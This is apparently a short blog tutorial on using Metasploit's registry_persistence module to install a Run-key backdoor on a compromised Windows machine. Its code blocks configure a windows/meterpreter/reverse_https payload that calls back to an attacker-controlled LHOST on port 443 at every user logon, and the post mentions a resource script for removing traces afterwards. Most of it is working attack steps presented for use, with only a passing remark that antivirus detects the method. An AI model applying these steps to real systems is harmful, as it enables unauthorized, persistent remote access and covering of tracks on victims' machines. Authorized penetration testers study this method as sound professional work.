---
layout: post
title: Basic Persistence with Metasploit
published: true
---

This short post goes over using Metasploit to gain basic user-level persistence on a Windows machine. The Metasploit module used in this exercise installs a registry key that executes a specific payload everytime the current user logs in, so you won't completely lose access to the target machine if the user logs off or reboots. This method *will* be detected by antivirus.

---

## Gaining Persistence

You will need an active Meterpreter session.

![sessions](/img/metasploit-persistence/01-sessions.png)

Select the Metasploit module `exploit/windows/local/registry_persistence`, which will install a payload as a value in the registry key `CurrentVersion\Run`.

```
use exploit/windows/local/registry_persistence
```

Check the module's options:

![options](/img/metasploit-persistence/02-options.png)

Set the SESSION option to the active Meterpreter session.

```
set SESSION 1
```

Set and configure the payload.

```
set payload windows/meterpreter/reverse_https
set LHOST <Metasploit-server-IP>
set LPORT 443
```

Configure any other options you think are necessary, such as RUN_NAME or BLOB_REG_NAME.

Run the module on the active meterpreter session.

![persistence](/img/metasploit-persistence/03-persistence.png)

The target machine now has a persistent backdoor on it that will attempt to connect back to our Metasploit server each time the current user logs on. As long as Metasploit is listening for incoming connections with the payload specified above, we should get a session.

![jobs](/img/metasploit-persistence/04-jobs.png)

*[Optional] Make note of the resource script that Metasploit creates when you use the persistence module so that you can run it in an active session and remove traces of your activity on the machine.*

![image of cleanup](/img/metasploit-persistence/05-cleanup.png)







